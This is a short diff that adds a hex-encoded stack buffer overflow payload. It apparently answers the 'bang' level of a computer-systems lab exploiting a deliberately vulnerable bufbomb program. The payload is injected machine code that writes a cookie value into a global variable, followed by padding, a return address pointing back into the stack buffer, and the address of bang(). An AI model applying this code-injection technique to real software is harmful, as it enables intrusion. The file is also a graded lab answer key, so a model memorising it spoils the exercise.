@@ -1,0 +1,12 @@
+/* padding required:			44bytes */
+/* mov 0x804c220, %eax (0x804c220 is address of cookie) */
+a1 20 c2 04 08
+/* mov %eax, 0x804c218 (0x804c218 is address of global_value) */
+a3 18 c2 04 08
+/* ret */
+c3
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Local buffer starts at address:	0x55683508 */
+08 35 68 55 
+/* bang() located at: 0x08048d05 */
+05 8d 04 08
